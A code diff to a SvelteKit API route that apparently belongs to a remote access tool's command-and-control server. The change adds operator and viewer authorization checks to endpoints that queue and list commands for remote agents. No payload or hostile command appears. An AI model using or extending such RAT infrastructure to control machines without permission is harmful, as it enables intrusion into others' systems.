@@ -1,16 +1,19 @@
 import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { registry, RegistryError } from '$lib/server/rat/store';
+import { requireOperator, requireViewer } from '$lib/server/authorization';
 import type {
 	CommandInput,
 	CommandQueueSnapshot
 } from '../../../../../../../shared/types/messages';
 
-export const POST: RequestHandler = async ({ params, request }) => {
+export const POST: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let payload: CommandInput;
 	try {
@@ -24,7 +27,7 @@ export const POST: RequestHandler = async ({ params, request }) => {
 	}
 
 	try {
-		const response = registry.queueCommand(id, payload);
+		const response = registry.queueCommand(id, payload, { operatorId: user.id });
 		return json(response);
 	} catch (err) {
 		if (err instanceof RegistryError) {
@@ -34,11 +37,13 @@ export const POST: RequestHandler = async ({ params, request }) => {
 	}
 };
 
-export const GET: RequestHandler = ({ params }) => {
+export const GET: RequestHandler = ({ params, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	requireViewer(locals.user);
 
 	try {
 		const commands = registry.peekCommands(id);
